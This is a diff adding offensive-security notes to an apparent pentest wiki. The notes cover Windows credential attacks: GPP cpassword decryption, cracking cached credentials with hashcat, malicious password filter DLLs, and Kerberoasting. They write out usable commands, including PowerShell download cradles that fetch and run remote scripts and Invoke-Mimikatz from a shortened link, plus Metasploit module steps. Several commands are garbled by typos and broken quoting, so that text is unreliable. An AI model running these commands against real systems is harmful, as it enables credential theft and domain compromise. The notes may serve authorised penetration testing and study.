@@ -293,8 +293,6 @@ DCSync (Modern)
 
 {% tabs %}
 {% tab title="Windows Native Tooling" %}
-
-
 * WCE - Windows Credential Editor
   * Lists windows logon sessions and add/change/delete associated credentials
 * Windows credential manager
@@ -324,6 +322,76 @@ DCSync (Modern)
 {% endtab %}
 
 {% tab title="GPP Vuln" %}
+Group Policy Preference Vul
+
+* Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
+* Uses a publiclally posed Microsoft AES , easy to find, easy to use
+* Exploit available Under powersploit script Get-GPPPassword.ps1
+* Metasploit module
+  * \>use post/windows/gather/credentials/gpp
+  * \>set SESSION \[Session # of your shell]
+  * \>exploit
+* [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
+{% endtab %}
+
+{% tab title="Cached Creds" %}
+Windows Cached Credentials
+
+* Windows caches the last 10 sets of credentials used on the device by default
+* Metasploit module - cachedump
+* Crack via hashcat
+  * format: $DCC2$10240#account\_name#hash
+  * oclHashcat64.exe -m 2100 hashes \mscash2.txt lists \crackstat\_realhuman\_shill.txt
+  * Warning: With a normal GPU this takes on average 20 days to crack
+{% endtab %}
+
+{% tab title="PW Filter DLL" %}
+
+
+Password FIlter DLL - used by Windows to enforce password strength policies.
+
+* System administrators can create password filter DLLs to ensure all password changes meet a minimum requirement.
+* New passwords are passed to the DLL in plaintext, allowing attackers to leverage this Windows feature to steal credentials.
+* Password changes on Windows are handled by the Local Security Authority (LSA). When a password change occurs, the LSA executes each registered password filter to check that the new passwords meets the specified requirements.
+* Each password filter must return ‘true’ for the password change to occur; if any of the filters return ‘false’, an error is displayed to the user. Password filters can be installed locally or on domain controllers (DCs).
+* Password filters are created as DLL files and placed in the ‘C:\Windows\System32’ directory.
+* Once in place, the new file must be registered by adding its name (without the .dll extension) to the registry entry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`.
+* The DLL file is comprised of three functions, each of which performs a specific task when executed.
+  * `InitializeChangeNotify` is called to notify the filter that a password change has been requested. This function returns true or false to indicate whether if the filter has initialised successfully.
+  * &#x20;`PasswordFilter` is called to validate the new password. This function contains the code to test the provided password and returns true or false to indicate if the password is valid.
+  * `PasswordChangeNotify` is called to inform the filter if the password change was made successfully.
+* Password filter DLLs can be used by malicious actors to harvest account credentials. The `PasswordFilter` and `PasswordChangeNotify` functions both have access to the plaintext password and the name of the account whose password is to be changed. By installing a malicious password filter, attackers can exfiltrate every updated password to a remote server, local file or even block every password change by setting their filter’s `PasswordFilter` function to always return false.
+* Ensuring that appropriate permissions are set for the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages` key will prevent unauthorized users or groups from being able to register new filter
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="Kerberoasting" %}
+
+
+Kerberoasting
+
+* Any ticeket can be requested by any user with kerberos, from the domain controller
+* Those tickets are encrypted with the NTLM hash of the associated service user.
+* If we can guess the password to teh associated service user's NTLM hash, then we now know the password to the actual service account
+* Steps:
+  * &#x20;List all SPN services. These are the service accounts for which we are going to pull all the kerberos tickets
+    * \>setspn -T \[domain] -F -Q \*/\*
+  * &#x20;Next we target either a single user SPN or pull all the user Kerberos tickets into our user's memory
+    * Single target
+      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList “HTTP/\[hostname].\[domain].local”
+    * All User tickets
+      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; IEX (New-Object Net.WebClient).DownloadString("https://githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList $\_.ServicePrincipalName}catch{}
+    * &#x20;And the powersploit tool to automate this!
+      * [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+    * Now we have our tickets imported into memory and we need to extract them.
+      * Mimikatz Kerberoast export:
+      * \>powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command ‘’'''''kerberos::list /export'''''''
+      * Once extracted and on our victims machine and we can start cracking them!
+        * use tgsrepcrack.p
+{% endtab %}
+
+{% tab title="Second Tab" %}
 
 {% endtab %}
 {% endtabs %}
